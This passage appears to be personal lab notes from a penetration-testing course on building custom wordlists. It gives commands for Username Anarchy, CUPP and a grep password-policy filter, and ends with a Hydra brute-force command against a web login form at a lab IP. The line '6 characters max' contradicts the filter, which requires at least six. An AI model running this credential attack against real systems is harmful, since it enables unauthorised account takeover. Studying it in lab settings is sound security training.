 install ruby, and then pull the `Username Anarchy` git to get the script:

  Custom Wordlists

```shell-session
sudo apt install ruby -y
```

```
git clone https://github.com/urbanadventurer/username-anarchy.git
```

```
cd username-anarchy
```

Next, execute it with the target's first and last names. This will generate possible username combinations.

  Custom Wordlists

```shell-session
./username-anarchy Jane Smith > jane_smith_usernames.txt
```

```shell-session
./username-anarchy -i ~/Desktop/AnarchyNames.txt > AnarchyProcessedNames.txt
```

CUPP

```shell-session
sudo apt install cupp -y
```

```shell-session
cupp -i
```

Filter

```shell-session
grep -E '^.{6,}$' jane.txt |
grep -E '[A-Z]' |
grep -E '[a-z]' |
grep -E '[0-9]' |
grep -E '([!@#$%^&*].*){2,}' > jane-filtered.txt
```

6 characters max
2 special characters

Hydra crack

```shell-session
hydra -L usernames.txt -P jane-filtered.txt 94.237.49.23 -s 50027 -f http-post-form "/:username=^USER^&password=^PASS^:Invalid credentials"
```

